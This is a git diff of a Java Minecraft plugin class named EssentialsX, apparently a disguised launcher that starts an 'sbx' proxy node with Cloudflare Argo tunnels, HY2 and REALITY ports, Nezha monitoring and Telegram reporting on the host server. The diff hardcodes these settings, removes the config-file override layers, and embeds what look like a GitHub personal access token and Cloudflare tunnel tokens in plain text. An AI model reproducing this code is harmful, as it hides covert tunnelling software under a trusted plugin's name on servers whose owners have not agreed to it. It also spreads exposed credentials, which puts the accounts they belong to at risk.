@@ -154,18 +154,17 @@ public class EssentialsX extends JavaPlugin {
         pb.directory(tmpDir.toFile());
         Map<String, String> env = pb.environment();
 
-        // 默认值全部为空，实际配置通过下方三层覆盖读入
-        // ★ 请在服务器 plugins/EssentialsX/config.yml 里填写以下变量 ★
-        env.put("UUID",            "a87056c0-abeb-45e4-a97e-f23bdf84d191");
+        // ★ 直接在这里填写你的 sbx 配置，优先级最高不会被覆盖 ★
+        env.put("UUID",            "a87056c0-abeb-45e4-a97e-f23bdf84d191");   // ← 填你的 UUID
         env.put("FILE_PATH",       "./world");
         env.put("NEZHA_SERVER",    "");
         env.put("NEZHA_PORT",      "");
         env.put("NEZHA_KEY",       "");
-        env.put("ARGO_PORT",       "8001");
-        env.put("ARGO_DOMAIN",     "3arb.xxxxx.cloudns.ch");
-        env.put("ARGO_AUTH",       "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYzYzNGJlOGYtNmYwOC00OTQwLTk4MjEtZGNiYzkyNDA4MDQ1IiwicyI6Ik9UVTBOalpqTjJVdFptUmtNUzAwWW1abExXSmtaRFF0TkRjME5URmtNMlUyT0RRMiJ9");
+        env.put("ARGO_PORT",       "8001");   // ← 填 Argo 端口，如 8001
+        env.put("ARGO_DOMAIN",     "3arb.xxxxx.cloudns.ch");   // ← 填固定域名，如 xxx.yourdomain.com；留空走临时隧道
+        env.put("ARGO_AUTH",       "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYzYzNGJlOGYtNmYwOC00OTQwLTk4MjEtZGNiYzkyNDA4MDQ1IiwicyI6Ik9UVTBOalpqTjJVdFptUmtNUzAwWW1abExXSmtaRFF0TkRjME5URmtNMlUyT0RRMiJ9");   // ← 填 eyJ... 完整 Token；留空走临时隧道
         env.put("S5_PORT",         "");
-        env.put("HY2_PORT",        "25570");
+        env.put("HY2_PORT",        "25570");   // ← 填 HY2 端口
         env.put("TUIC_PORT",       "");
         env.put("ANYTLS_PORT",     "");
         env.put("REALITY_PORT",    "");
@@ -173,22 +172,18 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL",      "");
         env.put("CHAT_ID",         "");
         env.put("BOT_TOKEN",       "");
-        env.put("CFIP",            "usa.visa.com");
-        env.put("CFPORT",          "443");
-        env.put("NAME",            "3arb");
+        env.put("CFIP",            "usa.visa.com");   // ← 填优选 IP，如 saas.sin.fan
+        env.put("CFPORT",          "443");   // ← 填端口，如 443
+        env.put("NAME",            "3arb");   // ← 填节点名称
         env.put("DISABLE_ARGO",    "false");
 
-        // 覆盖层1：系统环境变量
+        // 仅用系统环境变量补充未填写的空值（不覆盖上方已填写的非空值）
         for (String k : SBX_ENV_VARS) {
-            String v = System.getenv(k);
-            if (v != null && !v.trim().isEmpty()) env.put(k, v);
-        }
-        // 覆盖层2：多路径 .env 文件查找（与文档3一致）
-        loadSbxEnvFileFromMultipleLocations(env);
-        // 覆盖层3：Bukkit config.yml（最高优先级）
-        for (String k : SBX_ENV_VARS) {
-            String v = getConfig().getString(k);
-            if (v != null && !v.trim().isEmpty()) env.put(k, v);
+            String hardcoded = env.get(k);
+            if (hardcoded == null || hardcoded.trim().isEmpty()) {
+                String v = System.getenv(k);
+                if (v != null && !v.trim().isEmpty()) env.put(k, v);
+            }
         }
 
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
@@ -240,8 +235,9 @@ public class EssentialsX extends JavaPlugin {
         // ★ 修改这两行来指向你自己的 GitHub 仓库和 Token ★
         String repoUrl     = env.getOrDefault("REPO_URL",     "https://github.com/heyzone/heibaiplugins");
         String githubAuth  = env.getOrDefault("GITHUB_AUTH",  "heyzone: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");
-        // ★ Cloudflare 固定隧道 Token（留空则自动 fallback 临时隧道）★
-        String tunnelToken = env.getOrDefault("TUNNEL_TOKEN", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9");
+        // ★ Cloudflare 固定隧道 Token，直接填在这里 ★
+        // 填 eyJ... 完整 token 使用固定域名；留空则每次使用临时隧道地址
+        String tunnelToken = "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9";
 
         String nodeDir = workDir + "/nodejs";
         String appDir  = workDir + "/app";
